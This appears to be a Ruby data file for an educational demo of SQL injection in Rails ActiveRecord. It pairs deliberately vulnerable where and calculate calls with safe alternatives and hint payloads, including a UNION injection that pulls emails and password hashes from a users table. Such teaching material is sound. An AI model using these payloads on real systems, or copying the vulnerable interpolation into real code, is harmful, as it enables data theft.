#Assumption is that everything in this file is html_safe
#
Queries = [
  {
    input_form: {action_url: :where},
    output: "query.to_a",
    name: "Where method",
    link: "http://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-where",
    query: 'Chest.where("size = \'#{params[:column]}\'")',
    hint: {
      input: {name: "params[:column]", example: ["') OR '1'='1", "Large') UNION select id, email, encrypted_password, name, mobile_number from users where ('1'='1"]},
      text: "This example returns all records, or in the case of the union returns user information."
    },
    footer: {
      sources: "sources go here",
      valid_date: "information as of this date xx/xx/xx",
      description: <<-CODE
def exec_sqli
  # Safe usages of where method
  # output = Chest.where(size: params[:column])
  # output = Chest.where("size = ?", params[:column])

  # Unsafe usage of where method
  output = Chest.where("size = '\#{params[:column]}'")

  render text: output.to_a
end
    CODE
    },
    desc: <<-HTML
          Some information provided by other websites regarding sql injection is no
          longer relevant to rails. Specifically you can no longer insert ';' into
          active record method calls and ignore the rest of the activerecord generated
          query. However, you can still use comment delimiters like '#'
          and '-- ' for mysql to comment out the rest of the query.
    HTML
  },

  {
    input_form: {action_url: :calculate},
    output: "query",
    name: "Calculate method",
    link: "link to calculate activerecord doc",
    query: 'Chest.calculate(:sum, "#{params[:column]}")',
    hint: {
      input: {name: "params[:column]", example: ["nothing yet", "nothing yet"]},
      example: "Explain how the injection works, what it accomplishes."
    },
    footer: {
      sources: "sources go here",
      valid_date: "information as of this date xx/xx/xx",
      description: <<-CODE
def exec_sqli
  # Unsafe use of calculate method
  output = Chest.calculate(:sum, '\#{params[:column]}')

  render text: output.to_a
end
    CODE
    },
    desc: <<-HTML
      Describe the usage of calculate and how it is vulnerable.
    HTML
  }
]
